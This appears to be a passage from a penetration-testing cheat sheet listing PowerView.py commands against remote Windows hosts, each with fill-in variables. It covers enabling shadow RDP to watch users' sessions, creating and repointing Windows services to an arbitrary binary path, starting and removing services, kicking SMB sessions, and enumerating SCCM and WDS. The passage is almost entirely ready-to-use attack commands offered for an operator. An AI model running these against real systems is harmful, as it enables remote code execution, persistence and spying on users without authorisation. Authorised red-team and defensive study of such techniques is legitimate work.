```sh title:"PowerView.py Enable Shadow RDP"
Enable-ShadowRDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Disable Shadow RDP

Disable shadow RDP with PowerView.py.

```sh title:"PowerView.py Disable Shadow RDP"
Disable-ShadowRDP -Computer $computer
```
<!-- cheat
var computer --- --header "Target computer"
-->

### Pop message box

Run pop message box with PowerView.py.

```sh title:"PowerView.py Run Pop Message Box"
Invoke-MessageBox -Computer $computer -Title "$title" -Message "$message"
```
<!-- cheat
var computer --- --header "Target computer"
var title --- --header "Box title"
var message --- --header "Body text"
-->

### Add Windows service

Add windows service with PowerView.py.

```sh title:"PowerView.py Add Windows Service"
Add-NetService -Computer $computer -Name $name -DisplayName "$display" -Path "$path"
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
var display --- --header "Display name"
var path --- --header "Binary path (e.g. C:\\svc.exe)"
-->

### Set service attributes

Set service attributes with PowerView.py.

```sh title:"PowerView.py Set Service Attributes"
Set-NetService -Computer $computer -Name $name -Path "$path"
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
var path --- --header "New binary path"
-->

### Start service

Start service with PowerView.py.

```sh title:"PowerView.py Start Service"
Start-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Stop service

Run stop service with PowerView.py.

```sh title:"PowerView.py Run Stop Service"
Stop-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Remove service

Remove service with PowerView.py.

```sh title:"PowerView.py Remove Service"
Remove-NetService -Computer $computer -Name $name
```
<!-- cheat
var computer --- --header "Target computer"
var name --- --header "Service name"
-->

### Kick SMB session

Run kick SMB session with PowerView.py.

```sh title:"PowerView.py Run Kick SMB Session"
Remove-NetSession -Computer $computer -TargetSession "$session"
```
<!-- cheat
var computer --- --header "Target computer"
var session --- --header "Target session (e.g. \\\\10.10.10.5)"
-->

### SCCM enumeration

Find SCCM enumeration with PowerView.py.

```sh title:"PowerView.py Find SCCM Enumeration"
Get-DomainSCCM -CheckDatalib
```
<!-- cheat -->

### WDS enumeration

Dump WDS enumeration with PowerView.py.

```sh title:"PowerView.py Dump WDS Enumeration"
Get-DomainWDS
```
<!-- cheat -->
